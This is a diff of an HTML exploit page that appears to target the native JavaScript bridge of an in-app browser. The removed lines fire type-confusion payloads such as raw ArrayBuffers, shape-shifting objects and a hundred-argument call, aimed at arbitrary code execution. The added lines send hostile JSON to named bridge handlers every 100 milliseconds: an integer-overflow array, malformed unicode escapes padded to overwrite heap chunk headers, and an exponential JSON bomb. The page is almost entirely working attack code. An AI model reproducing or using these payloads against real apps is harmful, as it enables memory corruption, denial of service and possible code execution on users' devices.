@@ -2,64 +2,48 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>JSI Type Confusion ACE</title>
+    <title>JSON Parser ACE Fuzzer</title>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace;">
-    <h3>Injecting Type Confusions...</h3>
-    <div id="log">Waiting for FB bridge...</div>
+<body style="background:#000; color:#ff0; font-family:monospace;">
+    <h3>Attacking Native JSON Deserializer...</h3>
+    <div id="log">Waiting for bridge...</div>
 
     <script>
         const logEl = document.getElementById('log');
         const uuid = "90dd8846-f47b-4312-8307-3681dc5bec88";
 
-        // 1. The Hex Payload: "AAAA" in memory
-        // If this gets loaded into the PC register, we have full ACE.
-        const memBuffer = new ArrayBuffer(64);
-        const memView = new Uint32Array(memBuffer);
-        memView.fill(0x41414141); 
+        // Attack 1: Integer Overflow in Array Allocation
+        // If the parser multiplies this by the element size, it wraps to a small number,
+        // allocating a tiny heap buffer that we immediately overflow.
+        const intOverflowJSON = '{"action":"init", "data": [' + "1,".repeat(50000) + ' 1], "size": 4294967295}';
 
-        // 2. The Shape-Shifter Object
-        // It pretends to be a string, but mutates memory when C++ tries to read it
-        const mutantObj = {
-            toString: function() {
-                // Return a massive string to try and shift the heap
-                return "A".repeat(10240); 
-            },
-            valueOf: function() {
-                return 0x41414141;
-            }
-        };
+        // Attack 2: Malformed Unicode Escape Heap Corruption
+        // Some C++ parsers miscalculate buffer sizes for \uXXXX escapes.
+        // We pad it with A's (0x41) to try and overwrite the next heap chunk header.
+        const badUnicodeJSON = '{"message": "A\\uD800\\uD800' + 'A'.repeat(5000) + '"}';
 
-        function fireTypeConfusion() {
+        // Attack 3: The "Billion Laughs" JSON Bomb
+        // Exponential entity expansion equivalent for JSON to exhaust heap memory rapidly.
+        let nested = '{"a":"A"}';
+        for(let i=0; i<15; i++) {
+            nested = `{"a": ${nested}, "b": ${nested}}`;
+        }
+        const jsonBomb = nested;
+
+        function fireJSONFuzzer() {
             if (typeof window.__call_iabjs_unified_bridge === 'function') {
-                logEl.innerText = "[*] Bridge found. Firing type confusions...";
+                logEl.innerText = "[*] Bridge active. Firing hostile JSON...";
                 
                 let bridge = window.__call_iabjs_unified_bridge;
 
-                // Attack 1: Pass raw ArrayBuffer instead of String
-                // If C++ casts this blindly, it will read our 0x41414141 directly
-                try { bridge("page_language", uuid, memBuffer); } catch(e) {}
-                try { bridge(memBuffer, uuid, "{}"); } catch(e) {}
-
-                // Attack 2: Pass the Shape-Shifter Object
-                try { bridge("text_classification", uuid, mutantObj); } catch(e) {}
-
-                // Attack 3: Pass Arrays of Arrays (Breaks recursive JSON parsers natively)
-                let deepArray = [];
-                for(let i=0; i<500; i++) deepArray = [deepArray, 0x41414141];
-                try { bridge("initializeCallbackHandler", uuid, deepArray); } catch(e) {}
-
-                // Attack 4: Argument Count Confusion
-                // Provide 100 arguments to a function expecting 3. 
-                // Can overwrite adjacent stack frames in poorly written JNI bindings.
-                let args = new Array(100).fill(0x41414141);
-                try { bridge.apply(this, args); } catch(e) {}
+                // Send the malicious JSON payloads
+                try { bridge("BrowserDeclutterJS", uuid, intOverflowJSON); } catch(e) {}
+                try { bridge("initializeCallbackHandler", uuid, badUnicodeJSON); } catch(e) {}
+                try { bridge("page_language", uuid, jsonBomb); } catch(e) {}
             }
         }
 
-        // Fire aggressively
-        setInterval(fireTypeConfusion, 50);
-
+        setInterval(fireJSONFuzzer, 100);
     </script>
 </body>
 </html>
